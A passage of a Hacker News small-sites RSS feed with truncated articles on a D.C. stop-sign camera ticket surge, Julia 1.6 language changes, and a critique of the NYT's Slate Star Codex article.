      <li><a href="https://www.jackkinsella.ie/articles/seo-at-the-whole-website-level">SEO at the Whole Website Level</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-by-mitigating-duplicate-content-issues">SEO by Mitigating Duplicate Content Issues</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-in-image-search">SEO in Image Search</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-through-backlinks">SEO Through Backlinks</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-with-social-networks">SEO with Social Networks</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/seo-and-internationalisation">SEO and Internationalisation</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/website-copywriting">Website Copywriting</a></li>
      <li><a href="https://www.jackkinsella.ie/articles/google-analytics-lessons">A Lasting Marriage: Google Analytics</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/the-conversion-surgeon-a-guide-to-conversion-rate-optimization">The Conversion Surgeon-Guide to Conversion Optimisation</a></li>
      <li><a target="_blank" href="https://blog.kissmetrics.com/epiphanies-needed-to-grasp-statistical-significance/">Statistical Significant Testing</a> <b> [External: Kissmetrics]</b></li>
      <li><a href="https://www.jackkinsella.ie/articles/email-marketing">Email Marketing</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/introduction-to-paid-advertising">Introduction to Paid Advertising</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/building-an-advertising-ready-web-application">Building an Advertising Ready Web Application (and other preparations for advertising)</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/staying-organised-when-advertising">Staying Organised When Advertising</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/a-tour-of-targeting">A Tour of Targeting</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/ad-creative-writing-basics">Basics of Writing Ad Creatives</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/strategic-principles-in-paid-advertising">Strategic Principles in Paid Advertising</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/optimising-and-debugging-paid-advertisements">Optimising and Debugging Paid Advertisements</a> </li>
    </ul>
  </div>
</div>

      </div></div>]]>
            </description>
            <link>https://www.jackkinsella.ie/books/entreprenerd/marketing_for_programmers</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133340</guid>
            <pubDate>Sun, 14 Feb 2021 15:52:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A ‚ÄúPredatory‚Äù Stop-Sign Camera Is Terrorizing My Neighborhood]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 17 (<a href="https://news.ycombinator.com/item?id=26133260">thread link</a>) | @LordAtlas
<br/>
February 14, 2021 | https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/ | <a href="https://web.archive.org/web/*/https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico"><p>Traffic cameras can cross the thin line in law enforcement between keeping citizens safe and fucking them over.&nbsp;</p><p>Full disclosure: I‚Äôm counting myself among the fucked over. In late August, I was notified by the photo enforcement wing of the D.C. Department of Motor Vehicles that I‚Äôd been issued four tickets for ‚Äúpassing‚Äù the same stop sign on four different occasions. Two of the tickets were written on the same day. A stop-sign camera, the lowest-form of traffic cam yet unleashed, got me. The fines totaled $400.</p><figure><img src="https://lh6.googleusercontent.com/IE1N-0rH7w9HBLp1zQWpNnnz0sPCmuNqvuT_JFyAfV41OvUmGHNi9NCKCMTmtIrLndixSJW4-YhU4CHUjBp_whpIuN7wbF0mcNjJ7j8S_dNULTHCQIlOCa-rMD_LKzmbl8I-8iNq" alt=""></figure><p>I try to obey parking and traffic laws. Obsessively even. Not because I‚Äôm cautious or a good citizen. Because I‚Äôm cheap as hell! And I know from experience that D.C. ticket writers will nail you every time you give them a reason to, and lots of times even when you don‚Äôt. Anybody who‚Äôs lived here for any time or even visited much can affirm.</p><p>The last time I wrote a story about the city‚Äôs hyperaggressive ticketing strategies was in the early 1990s. At the time, violent crime was so out of hand here that the place was known as America‚Äôs Murder Capital. But local government‚Äôs most obvious crime-fighting efforts came in the parking realm. D.C. was making so much money off parking violations that officials were actually putting on seminars for leaders from various states and even foreign governments on how to increase revenues through ticket writing. I lived in the very dense Mount Pleasant neighborhood back then and legal parking was hard as hell to find. But even if you found a spot you weren‚Äôt safe. I‚Äôd sometimes spend 15 minutes driving around before landing a spot without a ‚ÄúNo Parking‚Äù sign in play and no painted curb or fire hydrant nearby or any sort of hint at all that this space was off-limits, only to return to my car an hour later to find a pink slip underneath the windshield wiper bogusly saying I‚Äôd violated the two-hour maximum time limit, or finding handwriting on the ticket saying my vehicle was ‚Äúless than 40 feet‚Äù from an intersection or driveway or whatever the ticket writer needed to help meet his or her quota and slap me with a $25-and-up fine. I remember coming out of my apartment one morning and seeing a posse from the Metropolitan Police Department (MPD) walking down the main drag, Mount Pleasant Street, and leaving a ticket on just about every windshield. I asked an officer what was happening and was told that they‚Äôd been ordered by their commander to enforce a law requiring all parked cars to have their wheels turned toward the curb. (Who knew such a law existed?)&nbsp;</p><p>The city made contesting a ticket an all-day affair in which you‚Äôd lose in the end anyway. Your car would get ‚Äú<a href="https://dpw.dc.gov/service/booting-and-impoundment" target="_blank" rel="noreferrer noopener">booted</a>‚Äù and towed by the city if you amassed more than three unpaid parking tickets or total fines above $200, and you couldn‚Äôt register a car or get a vehicle inspection or renew a drivers license in the city without settling your DMV bill. I pretty much always had more than three outstanding tickets, and the penalties doubled after a month, so I often owed the city more in fines than my beater Toyota was even worth. I worked hard trying to beat the system. I stayed on the road by registering my car at my mom‚Äôs address in suburban Virginia, and using that same address for my driver‚Äôs license. I was constantly going to the Virginia DMV and paying a $25 fee to get new license plates that wouldn‚Äôt be on D.C.‚Äôs boot/tow list, which surely had my old tag numbers on it. I knew at the time that my fight wasn‚Äôt exactly righteous. But, well, the city wasn‚Äôt exactly observing Marquess of Queensberry Rules with me either.</p><p>The car wars ended when my jalopy got stolen. Losing the car, even by theft, actually came as a relief. I didn‚Äôt own another vehicle until I left Mount Pleasant in 2002 for the Petworth neighborhood and all its street parking.&nbsp;</p><p>I hadn‚Äôt really thought of the ticketing horrors from my past since the move. But the four stop-sign violations at the same intersection‚Äîat $100 a pop!‚Äîbrought all the bad memories back. The city‚Äôs letter to me telling me about the tickets said there was video of my offenses online. I was able to access only one of the four clips. It was indeed my car in the shot, and it showed that as I approached the four-way stop I slowed down to almost zero miles an hour, but hell if I ever came to a dead stop. The old California stop. By the letter of the law, I was a violator. Dammit.</p><p>But this massive punishment still felt off. I‚Äôve been living about 200 yards from that <a href="https://www.google.com/maps/place/Kansas+Ave+NW+%26+Buchanan+St+NW,+Washington,+DC+20011/@38.946233,-77.0248877,17z/data=!3m1!4b1!4m5!3m4!1s0x89b7c86d4e139bf7:0x7b586b15117de56f!8m2!3d38.946233!4d-77.022699" target="_blank" rel="noreferrer noopener">four-way-stop intersection</a> for 19 years now, and have known about that stop-sign camera for a huge chunk of that time. But I‚Äôd never gotten a single ticket from it. I‚Äôd never even heard of anybody else in the neighborhood getting nabbed. But here I get four in one load of mail. </p><p>So I started looking into the camera that nailed me. Turns out it holds a special place in the shitty history of traffic enforcement. The <a href="https://cluballiance.aaa.com/public-affairs/press-release/?rdl=hartford.aaa.com&amp;Id=8b025de6-9f63-41a4-9541-f223b66c30c9" target="_blank" rel="noreferrer noopener">American Automobile Association</a> described D.C. as the first major city to use photo enforcement for stop-sign violations. And the stop-sign cam in my neighborhood, installed in 2013, was <a href="https://wtop.com/news/2013/08/dc-tests-first-stop-sign-camera/" target="_blank" rel="noreferrer noopener">the first ever in D.C.</a> I found a segment from NBC‚Äôs <a href="https://www.youtube.com/watch?v=5i4cgoxxeIs&amp;ab_channel=DefendYourLiberty" target="_blank" rel="noreferrer noopener"><em>The Today Show</em></a> on the introduction of stop-sign cameras that had NBC reporter Tom Costello doing his stand-up from the same intersection where seven years later I‚Äôd get nabbed. Costello boasted about all the safety benefits the new technology would bring, while Cathy Lanier, chief of the Metropolitan Police Department at the time, told the morning show audience that the cameras were set up because ‚Äúour community has asked us to enforce the law.‚Äù&nbsp;</p><p>‚ÄúNow we‚Äôll be able to do it with less manpower and safer for police officers,‚Äù said Lanier (who left the city a few years after bringing in the cameras to join the NFL as senior vice president in charge of security).&nbsp;&nbsp;</p><figure><img loading="lazy" width="3024" height="1716" src="https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?w=1024" alt="stop sign" srcset="https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg 3024w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=300,170 300w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=768,436 768w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=1024,581 1024w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=1536,872 1536w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=2048,1162 2048w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=1080,613 1080w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=85,48 85w" sizes="(max-width: 3024px) 100vw, 3024px"><figcaption>Photo by Dave McKenna</figcaption></figure><p>I also found a neighborhood message board with several live threads about the stop-sign camera, full of posts from angry locals who‚Äôd been recently nailed at the same intersection. The more I read, the easier I felt I‚Äôd got off: Others told of getting double-digit tickets, meaning they were facing a four-figure fine. Somebody posted a short video of the camera snapping photos of a car that stopped dead at the intersection.</p><p>This particular stop-sign camera‚Äôs fortunes, however, may well have turned when it flashed at Deepak Gopalakrishna.&nbsp;</p><p>Gopalakrishna happens to be a transportation engineer with a specialty in road safety. He‚Äôs lived in Petworth for years and told me he hadn‚Äôt ever gotten a ticket on Kansas Avenue NW until this summer. He started asking around and found that just about everybody else on his block had also gotten multiple $100 fines. He said his professional background and personal leanings have had him support pro-bike, ‚Äúnot car-friendly‚Äù programs like the <a href="https://visionzeronetwork.org/" target="_blank" rel="noreferrer noopener">Vision Zero</a> project. And he said he has no fixed bias against speed cameras and red light cameras. But the rate at which he‚Äôd been nailed told him that this stop-sign camera had to go.</p><p>‚ÄúI‚Äôve got five tickets,‚Äù Gopalakrishna told me. ‚ÄúBefore I found out about the first one, I‚Äôd gotten four more.‚Äù</p><p>Gopalakrishna FOIA‚Äôd for information on the equipment being used by the city for its stop-sign camera setup and just how many tickets had been issued at that one intersection. He learned that the stop-sign cam‚Äôs sensor in Petworth, a <a href="https://www.smartmicro.com/fileadmin/media/Downloads/Traffic_Radar/Sensor_Data_Sheets__24_GHz_/UMRR_Traffic_Sensor_Type_44_Data_Sheet.pdf" target="_blank" rel="noreferrer noopener">Smartmicro UMrr-11 Type 44 Radar Antenna</a>, had been recalibrated on June 5, 2020. A ticket boom commenced soon after.</p><p>Data from MPD shows that in June 2020, the camera in question snapped 82 violators. Then there were 2,850 tickets in July 2020 (compared to 231 tickets in July 2019). Then the camera started flashing like paparazzi in Cannes: From August through November, a total of 17,216 tickets were issued. That‚Äôs $1,721,600 from one camera at one intersection in just four months.&nbsp;</p><p>Again, I learned years ago that D.C. had a black belt in ticket writing. But today‚Äôs stats floor even me. <a href="https://dccouncil.us/wp-content/uploads/2020/01/dmv20.pdf" target="_blank" rel="noreferrer noopener">D.C. DMV</a> documents show that the city issued 2,869,810 traffic and parking tickets in fiscal year 2019, with fines totaling $375,916,124. That averages out over the year to more than four tickets and about $543 in fines for every man, woman and child living in the city, including those who don‚Äôt drive. (Comprehensive ticket revenues for 2020, which would include the Petworth stop-sign camera windfall, are not yet available.) This is a town with oodles of tourism and, pre-pandemic, teeming with commuters, so visitors paid lots of penalties. But the cam located smack in the middle of my residential neighborhood penalized D.C. residents far more than outsiders.&nbsp; </p><p>According to Gopalakrishna, there‚Äôs no obvious quality-of-life benefit to the citizenry for all the pain folks who live near a stop-sign cam must suffer.</p><p>‚ÄúI want to be very clear: Being against this camera isn‚Äôt being against safety. This isn‚Äôt a safety matter,‚Äù he said. ‚ÄúThis isn‚Äôt like a red-light camera or a speed camera. There‚Äôs no safety study, no data saying, ‚ÄòWow, these stop-sign cameras really have had an impact on safety!‚Äô There‚Äôs nothing. I can point to a lot of things that have worked and are known to work: rumble strips, certain lighting on that stop sign, for example. Take those steps, and you‚Äôll get more people stopping, and you can talk about safety. But, those things don‚Äôt bring in revenue for the city. This camera does. And once you remove the safety component, it‚Äôs just targeting. Targeting one neighborhood.‚Äù</p><p>Gopalakrishna said he‚Äôs been unable to get answers on what exactly took place when the stop-sign camera was recalibrated in June. The user manual for the <a href="https://www.smartmicro.com/fileadmin/media/Downloads/Traffic_Radar/Sensor_Data_Sheets__24_GHz_/UMRR_Traffic_Sensor_Type_44_Data_Sheet.pdf" target="_blank" rel="noreferrer noopener">Smartmicro UMrr-11 Type 44 Radar Antenna</a>, describes its utility only in speed camera and red light enforcement applications. There is no mention anywhere in the document of its use in a stop-sign camera setup.</p><p>‚ÄúIt‚Äôs frustrating because there‚Äôs no legal definition of what a full-stop is,‚Äù he said. ‚ÄúIt‚Äôs all so arbitrary. So basically, this private company gets to decide what a complete stop is, and they set the camera ‚Ä¶</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/">https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/</a></em></p>]]>
            </description>
            <link>https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133260</guid>
            <pubDate>Sun, 14 Feb 2021 15:42:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Julia 1.6: what has changed since Julia 1.0?]]>
            </title>
            <description>
<![CDATA[
Score 244 | Comments 196 (<a href="https://news.ycombinator.com/item?id=26132801">thread link</a>) | @Sukera
<br/>
February 14, 2021 | https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html | <a href="https://web.archive.org/web/*/https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content">
      <p>Julia 1.0 came out well over 2 years ago.
Since then a lot has changed and a lot hasn‚Äôt.
Julia 1.0 was a commitment to no breaking changes, 
but that is not to say no new features have been added to the language.</p>

<!--more-->

<nav id="toc"></nav>

<p>Julia 1.6 is a huge release and it is coming out relatively soon.
RC-1 was <a href="https://discourse.julialang.org/t/julia-v1-6-0-rc1-is-now-available/54775">released recently</a>.
I suspect we have at least a few more weeks before the final release.
The Julia Core team take a huge amount of care in not breaking any packages.
So while that is all being checked and corner cases fixed, I think we have some time.
Thus this post, reflecting not just on 1.6, but on everything that has happened since the 1.0 release.</p>

<p>Julia 1.6 will be the first ‚Äúfeature‚Äù release since 1.0.
Prior to 1.0, all releases were feature releases; they came out when they were ready.
Since then, all releases (except 1.6) have been timed releases.
The release candidate is cut from the main branch every 3 months; and they are released after an <a href="https://github.com/JuliaLang/julia/pull/35846">extensive round of additional checking</a>, which often takes weeks to months.
Julia 1.6 was soft-slated to be the new long-term-support (LTS) version that would have bug-fixes backported to it for the next few years.
The current LTS is Julia 1.0, which has now had 5 patch releases made.
Since it was going to be supported for a long-time, people wanted to make sure everything good got in; thus it was a feature release.
The core developers have demurred on if 1.6 will actually be selected to be the new LTS (even if it is selected, it won‚Äôt ascend to being the LTS til it stops being the current Stable).</p>

<p>My impression now is that they feel like it has too many cool new things; and that a few things didn‚Äôt quite make it in even with the extended release cycle.
So it‚Äôs looking likely to me that 1.7 will actually be the LTS; but that it might also be a feature release ‚Äì possibly this time a much shorter release period than usual.
In practice I think for a lot of package maintainers 1.6 will be a LTS, in that that is the oldest version they will make sure to continue to support.
There have been too many cool new things (as this post will detail) to stay back to only 1.0 features.
Already a lot of packages have dropped support for Julia versions older than 1.3.</p>

<p>This post is kind of a follow-up to my <a href="https://www.oxinabox.net//2018/06/01/Julia-Favourite-New-Things.html">Julia 1.0 release run-down</a>.
But it‚Äôs going to be even longer, as it is covering the last 5 releases since then and I am not skipping the major new features.
I am writing this not to break down release by release,
but to highlight features that, had you only used Julia 1.0, you wouldn‚Äôt have seen.
Full details can be found in the <a href="https://github.com/JuliaLang/julia/blob/backports-release-1.6/NEWS.md">NEWS.md</a>, and <a href="https://github.com/JuliaLang/julia/blob/backports-release-1.6/HISTORY.md">HISTORY.md</a></p>

<h2 id="front-end-changes">Front-end changes</h2>
<h3 id="soft-scope-in-the-repl">Soft-scope in the REPL</h3>
<p>Julia 1.0 removed the notion of soft-scope from the language.
I was very blas√© about the change to for-loop bindings in my <a href="https://www.oxinabox.net/2018/06/01/Julia-Favourite-New-Things.html#for-loop-variable-binding-changes">1.0 release post</a>.
In fact, I didn‚Äôt even mention this particular change.
It was <a href="https://github.com/JuliaLang/julia/pull/19324">#19324</a> for reference.</p>

<p>This was undone in in Julia 1.5 with <a href="https://github.com/JuliaLang/julia/pull/33864">#33864</a> for the REPL only.
Now in the REPL, assigning to a global variable within a for-loop actually assigns that variable, rather than shadowing it with a new variable in that scope.
The same behavior outside the REPL now gives a warning.</p>

<p>Personally, this change never affected me because I never write for-loops that assign variables at global scope.
Indeed basically all code I write is inside functions.
But I do see how this causes problems for some interactive workflows, e.g. when demonstrating something.
See the <a href="https://github.com/JuliaLang/julia/issues/28789">main GitHub issue</a> and the longest <a href="https://discourse.julialang.org/t/another-possible-solution-to-the-global-scope-debacle/15894">Discourse thread</a>, though there were many others.
It took over a year of discussion to work out the solution, particularly because many of the more obvious solutions would be breaking in significant ways.</p>

<h3 id="deprecations-are-muted-by-default">Deprecations are muted by default</h3>

<p>Julia 1.5+ doesn‚Äôt display deprecation warnings, unless you run julia with the <code>--depwarn=yes</code> flag.
This was me in <a href="https://github.com/JuliaLang/julia/pull/35362">this PR</a>.
It‚Äôs not something I am super happy about, although I think it makes sense.
Using deprecated methods is actually fine, as long as your dependencies follow SemVer, and you use <code>^</code> (i.e. default) bounding in your Project.toml‚Äôs <code>[compat]</code>, which everyone does, because it‚Äôs enforced by the auto-merge script in the General registry.
Often it is even necessary if you want to keep compatibility for a while.</p>

<p>Solving deprecations is a thing you should actively choose to do rather than casually when trying to do something else.
In particular, when updating to support a new major release of one of your dependencies, you should follow a process.
Something like:</p>

<ol>
  <li>Check the release notes.</li>
  <li>Relax compat bounds</li>
  <li>Run your integration tests, if everything passes you are done.</li>
  <li>If tests failed, revert the change to compat bounds, then rerun your integration tests paying attention to deprecation warnings.</li>
</ol>

<p>Updating your dependencies should be an active choice.
Potentially one that is automated, but not one that you do while adding another feature (if you can help it).</p>

<p>The core of the reason we disabled them is because they were actually breaking things.
Irrelevant deprecation warning spam from dependencies of dependencies was causing JuMP and LightGraphs to become too slow to be used.
Further, since they were from dependencies of dependencies, the maintainers of JuMP and LightGraphs (let alone the end users) couldn‚Äôt even fix them.</p>

<p>Deprecation warnings are still turned on by default in tests, which makes sense since the tests (unlike normal use) are being run by maintainers of the package itself, not its users.
This however still doesn‚Äôt make a huge amount of sense to me, since spam from deprecation warnings floods out the actual errors that you want to see during testing.
For this reason, <a href="https://invenia.ca/">Invenia</a> (my employer) has disabled deprecation warnings in the CI tests for all our closed source packages, and added a new test job that just does deprecation checking (set to error on deprecation and with the job allowed to fail, just so we are informed).</p>

<p>Hopefully one day we can improve the tooling around deprecation warnings.
An ideal behavior would be to only show deprecation warnings if directly caused by a function call made from within the package module of your current active environment.
I kind of know what we need to do to the logger to make that possible, but it is not yet something I have had time to do.</p>

<h3 id="code-highlighting-for-code_llvm-and-code_native">Code highlighting for <code>code_llvm</code> and <code>code_native</code></h3>
<p>This was added in <a href="https://github.com/JuliaLang/julia/issues/36634">#36634</a>.
This functionality was first implemented in <a href="https://github.com/kimikage/ColoredLLCodes.jl">ColoredLLCodes.jl</a>, where it worked by monkey-patching the InteractiveUtils stdlib.
That package does still work on Julia 1.0.</p>

<p><strong>Julia 1.0:</strong></p>

<p><img src="https://www.oxinabox.net/posts_assets/Julia-1.0-1.6-changes/julia-1.0-code-llvm.png" alt="Julia 1.0 code_llvm"></p>

<p><strong>Julia 1.6:</strong></p>

<p><img src="https://www.oxinabox.net/posts_assets/Julia-1.0-1.6-changes/julia-1.6-code-llvm.png" alt="Julia 1.6 code_llvm"></p>

<p>The REPL itself still doesn‚Äôt have syntax highlighting for Julia code though.
The <a href="https://github.com/KristofferC/OhMyREPL.jl">OhMyRepl</a> package does provide that, and works for all versions of Julia.
It is a lot more than a series of regexes though, so I don‚Äôt think we are going to see it built into Julia too soon.
Probably one day, though, as its big dependencies are also required if the parser wants to move to be written in Julia (though I also don‚Äôt expect that any time soon).</p>

<h3 id="clearer-stacktraces">Clearer Stacktraces</h3>

<p>Just like colored <code>code_llvm</code>, colored stack-traces also originated in a package that was doing some nasty monkey-patching: <a href="https://github.com/jkrumbiegel/ClearStacktrace.jl">ClearStacktrace.jl</a>.
This was added into Base itself in <a href="https://github.com/JuliaLang/julia/pull/36134">#36134</a>.</p>

<p><strong>Julia 1.0:</strong></p>

<p><img src="https://www.oxinabox.net/posts_assets/Julia-1.0-1.6-changes/julia-1.0-stacktrace.png" alt="Julia 1.0 stacktrace"></p>

<p><strong>Julia 1.6:</strong></p>

<p><img src="https://www.oxinabox.net/posts_assets/Julia-1.0-1.6-changes/julia-1.6-stacktrace.png" alt="Julia 1.6 stacktrace"></p>

<p>The first thing you probably notice is the colored package names, to make it more clear where the error is coming from.
You also should notice the dimming of type parameters to make complicated types easier to read.
Also the addition of argument names, and showing functions with keyword arguments as they are written, rather than as a weird <code>#DataFrame#654</code> internal function.
The whole thing just looks more modern and polished.</p>

<h3 id="time-traveling-debugger">Time Traveling Debugger</h3>

<p><a href="https://julialang.org/blog/2020/05/rr/">Julia 1.5 added built-in support</a> for <a href="https://rr-project.org/"><code>rr</code></a> (Linux only for now).
This is not useful so much for debugging Julia code, but for debugging Julia itself.
If you get into one of the very rare situations where the language is doing something truly nonsensical, you can send a bug report recorded via <code>rr</code> and someone can debug <em>exactly</em> what is happening - even to the extent of <a href="https://julialang.org/blog/2020/09/rr-memory-magic/">diagnosing faulty RAM</a>.
<code>rr</code> is an impressively cool piece of tech.
It records execution of a program, intercepting places (namely syscalls) that could be nondeterministic and storing the result.
It can then replay the recording (even on another machine), and see exactly what happened.
Allowing on to go into great detail on the state, and step backwards and forwards through time.
The <code>rr</code> integration is really nice and easy to use.
On a project I was running, I ended up getting a member of our architecture and operations team run it to submit a support request and they had no real troubles
(And they are by no means a Julia pro, they write mostly Cloudformation).</p>

<h2 id="syntax">Syntax</h2>

<h3 id="import-as"><code>import as</code></h3>

<blockquote>
  <p>The syntax import A as B (plus import A: x as y, import A.x as y, and using A: x as y) can now be used to rename imported modules and identifiers (<a href="https://github.com/JuliaLang/julia/issues/1255">#1255</a>).</p>
</blockquote>

<p>This will be familiar to Python folks who love to write things like: <code>import numpy as np</code>.
I hope we never see it used that ubiquitously in julia.
I am quite happy with <code>using Foo</code> which imports into scope everything the author of <code>Foo</code> exported.
Python people find that super weird and scary; but it‚Äôs fine.
Note that in Julia, many (most?) things you use don‚Äôt belong to the scope of the module that defined them anyways; they are overloaded functions e.g. from <code>Base</code>.
So what you import doesn‚Äôt matter as much as you might think.
I recently learned that Haskell is like Julia with a default of importing all exports.
It has been fine for julia, and fine for Haskell for ages, though in neither is it required.</p>

<p>The real value of <code>import FooBar as fb</code> is not to have a short abbreviation so you can do <code>fb.quux</code>.
That was already possible via <code>const fb = FooBar</code>.
It is to handle cases where the package name itself conflicts with an identifier.
For example (as has often occurred) if one uses a <code>Pipe</code> in the REPL, and then later wants to load <a href="https://github.com/oxinabox/Pipe.jl/">Pipe.jl</a> via <code>import Pipe</code> then one gets a name clash before it can be ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html">https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html</a></em></p>]]>
            </description>
            <link>https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26132801</guid>
            <pubDate>Sun, 14 Feb 2021 14:46:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[In defense of interesting writing on controversial topics]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 132 (<a href="https://news.ycombinator.com/item?id=26132104">thread link</a>) | @petulla
<br/>
February 14, 2021 | https://www.slowboring.com/p/slate-star-codex | <a href="https://web.archive.org/web/*/https://www.slowboring.com/p/slate-star-codex">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>This is a free preview of Slow Boring. If you like what you read, consider supporting this site by <a href="http://www.slowboring.com/subscribe">subscribing</a>. </em></p><p>Some time ago, Scott Alexander, the pseudonymous author of the Slate Star Codex blog, announced that he was abandoning his site. The reason was that a New York Times reporter had been in touch with him explaining that he was doing a profile of the blog, and in the course of writing it he was compelled by some NYT policy to disclose Alexander‚Äôs real name. </p><p>Alexander is a practicing psychiatrist and felt that for reasons of professional ethics, this would jeopardize his job ‚Äî so he shut the blog down in a rather dramatic fashion. This, in turn, led to a lot of condemnatory rhetoric from his fans and admirers, many of whom work in the technology industry and had a set of preexisting grievances with what they call ‚Äúthe media‚Äù and what I would call ‚Äúthe technology coverage of a half dozen outlets, notably including The New York Times.‚Äù Much of the ensuing rhetoric from the pro-SSC camp (though not from Alexander, who if anything is even-tempered to a fault in his public persona) struck me as overheated, but I was sad it had driven Alexander from the internet.</p><p>The good news is that he has since resurfaced on Substack at <a href="https://astralcodexten.substack.com/">Astral Codex Ten</a>. He also has a new job as the founder of <a href="https://lorienpsych.com/">Lorien Psychiatry</a>, an innovative effort to use telemedicine to make psychiatric treatment much more affordable. </p><p>Then, on Saturday, <a href="https://www.nytimes.com/2021/02/13/technology/slate-star-codex-rationalists.html">Cade Metz‚Äôs NYT article about SSC finally dropped</a>. And it‚Äôs terrible. (Read <a href="https://astralcodexten.substack.com/p/statement-on-new-york-times-article">Alexander‚Äôs post</a> about it, though I think he has too much of a conspiratorial view of this.<a id="footnote-anchor-1" href="#footnote-1">1</a>)</p><p>I tend to think that too much time and mental energy is expended, including by me, on critiquing bad articles, and not enough time and energy is spent on praising good ones. So I feel kind of bad about writing a detailed criticism of a single bad article. But, given the larger context in which this story appeared, my sense is it‚Äôs going to become a flashpoint for a whole bunch of interesting struggles, so I think it‚Äôs useful and informative to say what I think. </p><h4>A tortured premise</h4><p>On its face, the idea of profiling an obscure blog written by a pseudonymous psychiatrist that has a surprisingly high-clout readership is perfectly good. Alexander‚Äôs readers include many Silicon Valley people, including ‚Äî as Metz details ‚Äî some very high-ranking executives. It‚Äôs an interesting story. </p><p>But I think Metz kind of misses what‚Äôs interesting about it from the get-go. </p><ul><li><p><a href="https://twitter.com/douthatnyt/status/859771088125005824?lang=en">Ross Douthat</a> reads SSC, and so does <a href="https://www.vox.com/2014/12/1/7311417/race-law-controls">Ezra Klein</a>. </p></li><li><p><a href="https://www.nytimes.com/2018/03/08/opinion/student-mobs.html">David Brooks</a> has quoted him in The New York Times. </p></li><li><p><a href="https://marginalrevolution.com/marginalrevolution/2017/04/excerpt-chat-ezra.html">Tyler Cowen</a> praises SSC and the larger ‚Äúrationalist community‚Äù that it was a flagship publication of, but also critiques them, saying ‚ÄúI would approve of them much more if they called themselves the irrationality community.‚Äù</p></li></ul><p>As you‚Äôll see in Metz‚Äôs story, the Vox writer Kelsey Piper is an SSC reader and a rationalist. But she works primarily for Vox‚Äôs <a href="https://www.vox.com/future-perfect">Future Perfect</a> vertical, which is a whole rationalist-inspired cornucopia of content. </p><p>In other words, this is an intellectual movement that‚Äôs somewhat influential in highbrow circles broadly, and that deserves to be situated as such. Well-known books like Toby Ord‚Äôs <a href="https://www.amazon.com/Precipice-Existential-Risk-Future-Humanity/dp/0316484911">‚ÄúThe Precipice‚Äù</a> and Philip Tetlock‚Äôs <a href="https://www.amazon.com/Superforecasting-Science-Prediction-Philip-Tetlock/dp/0804136718">‚ÄúSuperforecasting: The Art and Science of Prediction‚Äù</a> are important parts of the rationalist firmament. There‚Äôs also Julia Galef‚Äôs excellent podcast ‚ÄúRationally Speaking‚Äù on which <a href="https://podcasts.google.com/feed/aHR0cDovL3d3dy5ueWNza2VwdGljcy5vcmcvc3RvcmFnZS9mZWVkcy9ycy54bWw/episode/YzZlZTFhZmUtMTkwMS00ZDZiLTg1Y2QtMjhlNDI3ODE5YTJk?hl=en&amp;ved=2ahUKEwiNhNeMzefuAhXNFVkFHUIfB5EQieUEegQIDhAF&amp;ep=6">you can hear me yacking</a>. </p><p>There‚Äôs a lot more going on than ‚Äúsome tech executives read this blog,‚Äù in other words. </p><p>But Metz does not seem interested in actually exploring rationalist ideas or understanding their content or the scope of their influence. Instead, the article is structured as a kind of syllogism:</p><ul><li><p>Scott Alexander‚Äôs blog is popular with some influential Silicon Valley people.</p></li><li><p>Scott Alexander has done posts that espouse views on race or gender that progressives disapprove of. </p></li><li><p>Therefore, Silicon Valley is a hotbed of racism and sexism. </p></li></ul><p>One time years ago, I went to Silicon Valley for a few days. As a white guy, I would not be well-situated to assess the extent to which it‚Äôs a hotbed of racism and sexism anyway, so I 